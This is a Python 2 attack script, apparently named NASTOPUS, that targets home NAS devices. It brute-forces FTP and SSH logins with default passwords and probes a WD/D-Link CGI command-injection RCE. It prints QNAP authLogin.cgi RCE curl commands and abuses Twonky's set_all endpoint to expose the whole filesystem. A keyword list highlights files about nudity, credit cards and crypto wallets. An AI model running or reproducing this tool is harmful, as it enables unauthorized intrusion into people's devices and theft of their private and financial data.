import urllib3
import sys
import socket
import time
from ftplib import FTP
from xml.etree import ElementTree
from subprocess import call
try: 
	import paramiko
except:
	print "paramiko not found! Run $ pip install paramiko"
try:
	import requests
except:
	print "requests not found! Run $ pip install requests"
	sys.exit()
try:
	from colorama import init, Fore
except:
	print "Colorama not found! Run $ pip install colorama"
	sys.exit()

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
init(autoreset=True)

USERNAMES = ["admin", "root"]
PASSWORDS = ["admin", "root", "welc0me", "password", "mypassword", "", "1234", "qnap", "wdmycloud",
				"123456", "qwerty", "qwertz", "111111", "12345678", "123456789", "123123"]
KEYWORDS = ["XXX", "XX", "TEEN", "ASS", "ACCOUNT", "CREDIT", "CV", "CARD", "NUDE", "BOOB", 
			"PUSSY", "DICK", "SEX", "EXPENSES", "ADMIN", "PASS", "PRETTY", "SCHATZ", 
			"CRYPTO", "CRIPTO", "BITCOIN", "WALLET"]
#Implement port
def ftpConnector(host, port):
	print (Fore.MAGENTA + "*** Starting Bruteforce attack on FTP ***")
	try:
		ftp = FTP(host)
		ftp.login()
		print (Fore.GREEN + "*** Anonymous ftp login is open. ***")
		ftp.quit()
		return True
	except:
		pass
	try:
		ftp=FTP(host)
		for passwd in PASSWORDS:
			for user in USERNAMES:
				ftp.login(user, passwd)
				ftp.quit()
				print (Fore.GREEN + "*** Credentials for ftp login on {0} found: {1}:{2}".format(host, user, passwd))
	except:
		pass
#Implement port
def sshConnector(host, port):
	print (Fore.MAGENTA + "*** Starting Bruteforce attack on SSH ***")
	for passwd in PASSWORDS:
		for user in USERNAMES:
			try:
				ssh = paramiko.SSHClient()
				ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
				ssh.connect(host, username=user, password=passwd)
				print (Fore.GREEN + "Connected to {0} with credentials {1}:{2}".format(host, user, passwd))
				return True
			except paramiko.AuthenticationException:
				time.sleep(1)
				pass
			except:
				pass
			finally:
				ssh.close()

def keywordDetector(line):
	for keyword in KEYWORDS:
		if line.upper().find(keyword) != -1:
			return True
	return False

def checkPort(host, port):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	try:
		s.connect((host,int(port)))
		s.shutdown(2)
		return True
	except:
		return False

def discoveryWebservices(host, port, protocol):
	'''
	def fuzzWD():

	def fuzzQNAP():

	def fuzzSYNOLOGY():

	def fuzzBUFFALO():
		'''
	if protocol == "http":
		print (Fore.MAGENTA + "*** Start discoveryHTTP ***")
		urlStart = "http://{0}:{1}/".format(host, port)
	else:
		print (Fore.MAGENTA + "*** Start discoveryHTTPS ***")
		urlStart = "https://{0}:{1}/".format(host, port)
	url = urlStart
	try:
		if protocol == "http":
			webservices =  requests.get(url, timeout=5, allow_redirects=True)
		else:
			webservices =  requests.get(url, timeout=5, verify=False, allow_redirects=True)
		if webservices.status_code == 200:
			# Check if UI is accessable
			if webservices.text.find("/UI") != -1:
				url = urlStart + "UI"
				if protocol == "http":
					uiAccess =  requests.get(url, timeout=5)
				else:
					uiAccess =  requests.get(url, timeout=5, verify=False)
				if uiAccess.status_code == 200:
					print (Fore.GREEN + "*** WD UI access available! ***")
				else:
					print (Fore.YELLOW + "*** WD UI access restricted! ***")
			elif webservices.text.find("Synology") != -1:
				print (Fore.GREEN + "*** Synology NAS found {0}://{1}:{2} ***".format(protocol, host, port))
			elif webservices.text.find("qnap") != -1 or webservices.text.find("QNAP") != -1:
				print (Fore.GREEN + "*** QNAP NAS found {0}://{1}:{2} ***".format(protocol, host, port))
				# Check if system is vulnerable for share enumeration
				url = urlStart + "cgi-bin/genNasShareXML.cgi"
				if protocol == "http":
					qnapVuln = requests.get(url, timeout=5)
				else:
					qnapVuln = requests.get(url, timeout=5, verify=False)
				if qnapVuln.status_code == 200:
					try:
						print (Fore.GREEN + "*** QNAP shares discovered ***")
						tree = ElementTree.fromstring(qnapVuln.content)
						for child in tree.iter():
							print child.text
					except:
						pass
			# Check if system is vulnerable for remote code execution
			url = urlStart + "cgi-bin/nas_sharing.cgi?dbg=1&cmd=51&user=mydlinkBRionyg&passwd=YWJjMTIzNDVjYmE&start=1&count=1;touch+/tmp/foo"
			if protocol == "http":
				cgiSharing =  requests.get(url, timeout=5)
			else:
				cgiSharing =  requests.get(url, timeout=5, verify=False)
			if cgiSharing.status_code == 500:
				print (Fore.GREEN + "*** System maybe vulnerable for remote code execution ***")
				print url
			#Check if we can get usernames
			'''
			url = urlStart + "api/2.1/rest/users?"
			if protocol == "http":
				usernames =  requests.get(url, timeout=5)
			else:
				usernames =  requests.get(url, timeout=5, verify=False)
			if usernames.status_code == 200:
				print (Fore.GREEN + " *** Usernames discovered: %s ***"%usernames.text)
			'''
			return True
		else:
			return False
	except requests.exceptions.SSLError:
		print (Fore.RED + "*** Exception: SSLError ***")
	except requests.exceptions.ConnectionError:
		print (Fore.RED + "*** Exception: ConnectionError ***")
class Twonky():
	host = ""
	port = ""
	version = ""
	def setContentBase(self):
		print (Fore.MAGENTA + "*** Set 'contentbase' path to '/'' ***")
		payload = "\ncontentbase=/\n"
		url = "http://{0}:{1}/rpc/set_all".format(self.host, self.port)
		try:
			response = requests.post(url, data=payload, timeout=5)
			if response.status_code != 200:
				print (Fore.RED + "*** Error status_code = {0}".format(str(response.status_code)))
				return False
			else:
				return True
		except requests.exceptions.ReadTimeout:
			print (Fore.RED + "*** Timeout while setting contentbase path to '/' ***")
			sys.exit()

	def serverInfo(self):
		print (Fore.MAGENTA + "*** Get Serverdetails from Twonky ***")
		url = "http://{0}:{1}/rpc/get_friendlyname".format(self.host, self.port)
		friendlyname = requests.get(url, timeout=2)
		if friendlyname.status_code == 200:
			print (Fore.GREEN + "Server Name: {0}".format(friendlyname.text))
		else:
			print (Fore.RED + "*** Not authorized to access settings, password protection active ***")
		url = "http://{0}:{1}/rpc/info_status".format(self.host, self.port)
		infoStatus = requests.get(url, timeout=2)
		for line in infoStatus.iter_lines():
			if line :
				if line.find("version") != -1:
					lineSplited = line.split("|")
					versionNumber = lineSplited[1]
					print (Fore.GREEN + "Twonky Version: {0}".format(versionNumber))
				elif line.find("serverplatform") != -1:
					lineSplited = line.split("|")
					serverPlatform = lineSplited[1]
					print (Fore.GREEN + "Serverplatform: {0}".format(serverPlatform))
					if serverPlatform.find("qnap") != -1:
						print (Fore.GREEN + "*** QNAP Server discovered ***")
						print (Fore.GREEN + "\rhttps://sintonen.fi/advisories/qnap-qts-multiple-rce-vulnerabilities.txt")
						print (Fore.GREEN + "\r$ curl -ki \"https://{0}/cgi-bin/authLogin.cgi?reboot_notice_msg=$(printf 'QNAPVJBD%08d%16s  14`(echo;id)>&2`' $(expr $(date +%s) % 100000000) Disconnect|base64|tr -d '\\r\\n')\"".format(host))
						print (Fore.GREEN + "\r$ curl -ki \"https://{0}:8080/cgi-bin/authLogin.cgi?reboot_notice_msg=$(printf 'QNAPVJBD%08d%16s  14`(echo;id)>&2`' $(expr $(date +%s) % 100000000) Disconnect|base64|tr -d '\\r\\n')\"".format(host))
						print (Fore.GREEN + "\rTry default login creds: admin:admin")
				elif line.find("builddate") != -1:
					lineSplited = line.split("|")
					buildDate = lineSplited[1]
					print (Fore.GREEN + "Build date: {0}".format(buildDate))
				elif line.find("pictures") != -1:
					lineSplited = line.split("|")
					pictureCount = lineSplited[1]
					print (Fore.GREEN + "Pictures shared: {0}".format(pictureCount))
				elif line.find("videos") != -1:
					lineSplited = line.split("|")
					videoCount = lineSplited[1]
					print (Fore.GREEN + "Videos shared: {0}".format(videoCount))
		self.version = versionNumber

	def browser(self):
		while True:
			var = raw_input("path nr: ")
			if var != "exit" and var != "exploit":
				if self.version == "8.3-19" or self.version == "8.3-17":
					url = "http://{0}:{1}/rpc/dir?path={2}".format(self.host, self.port, var)
				else:
					url = "http://{0}:{1}/rpc/dir/path={2}".format(self.host, self.port, var)
				try:
					response = requests.get(url)
					print "-" * 30
					for line in response.iter_lines():
						if line :
							if len(line) > 3:
								if line[3] == "D":
									line = line[:4].replace("D", " D ") + line[4:]
									if keywordDetector(line[4:]):
										print (Fore.RED + line)
									else:
										print (Fore.GREEN + line)
								elif line[3] == "F":
									line = line[:4].replace("F", " F ") + line[4:]
									if keywordDetector(line[4:]):
										print (Fore.RED + line)
									else:
										print line
								else:
									print line
					print "-" * 30
				except:
					print "*** Error occured ***"
					sys.exit()
			elif var == "exploit":
				payload = "\nfriendlyname=WDMyCloud\n"
				url = "http://{0}:{1}/rpc/set_all".format(self.host, self.port)
				response = requests.post(url, data=payload)
				if response.status_code != 200:
					print (Fore.RED + "*** Error status_code = " + str(response.status_code))
			elif var == "exit":
				sys.exit()


#*** Program start here ***
if __name__ == '__main__':
	if len(sys.argv) != 2:
		print "Usage: $ " + sys.argv[0] + " [IP_adress]"
	else:
		print """
	##############################################################
	#  _   _           _____ _______ ____  _____  _    _  _____  #
	# | \ | |   /\    / ____|__   __/ __ \|  __ \| |  | |/ ____| #
	# |  \| |  /  \  | (___    | | | |  | | |__) | |  | | (___   #
	# | . ` | / /\ \  \___ \   | | | |  | |  ___/| |  | |\___ \  #
	# | |\  |/ ____ \ ____) |  | | | |__| | |    | |__| |____) | #
	# |_| \_/_/    \_\_____/   |_|  \____/|_|     \____/|_____/  #
	# v.0.1 by mez                                               #
	##############################################################"""

		host = sys.argv[1]
		print (Fore.MAGENTA + "https://www.shodan.io/host/{0}".format(host))
		ports = ["21", "2121", "22", "2222", "80", "443", "5000", "8080", "8081", "8083", "8000", "8443", "9000", "9001", "9002", "9003" "9251"]
		for port in ports:
			if checkPort(host, port):
				print (Fore.GREEN + "*** Port {0} opened ***".format(port))
				if port == "21" or port == "2121":
					ftp = raw_input("Brute force attack FTP [N]? [Y, N] ")
					if ftp.upper() == "Y":
						ftpConnector(host, port)
				elif port == "22" or port == "2222":
					ssh = raw_input("Brute force attack SSH [N]? [Y, N] ")
					if ssh.upper() == "Y":
						sshConnector(host, port)
				elif port == "80" or port == "8080" or port == "8000" or port == "8081" or port == "5000":
					discoveryWebservices(host, port, "http")
					nikto = raw_input("Run nikto on port {0} [default N]? [Y, N] ".format(port))
					if nikto.upper() == "Y":
						call(['nikto', '-h', 'http://{0}:{1}'.format(host, port)]) 
				elif port == "443" or port == "8443" or port == "8081" or port == "8083":
					discoveryWebservices(host, port, "https")
					nikto = raw_input("Run nikto on port {0} [default N]? [Y, N] ".format(port))
					if nikto.upper() == "Y":
						call(['nikto', '-h', 'https://{0}:{1}'.format(host, port)]) 
				elif port == "9000" or port == "9001" or port == "9002":
					twonky = raw_input("Run Twonky browser on port {0} [default N]? [Y, N] ".format(port))
					if twonky.upper() == "Y":
						twonkyObject = Twonky()
						twonkyObject.host = host
						twonkyObject.port = port
						twonkyObject.version = twonkyObject.serverInfo()
						if twonkyObject.setContentBase():
							twonkyObject.browser()
						'''
						versionNumber = Twonky.serverInfo(host, port)
						if Twonky.setContentBase(host, port):
							Twonky.browser(host, port, versionNumber)
						'''
				elif port == "9251":
					print "https://www.rapid7.com/db/modules/exploit/linux/misc/qnap_transcode_server"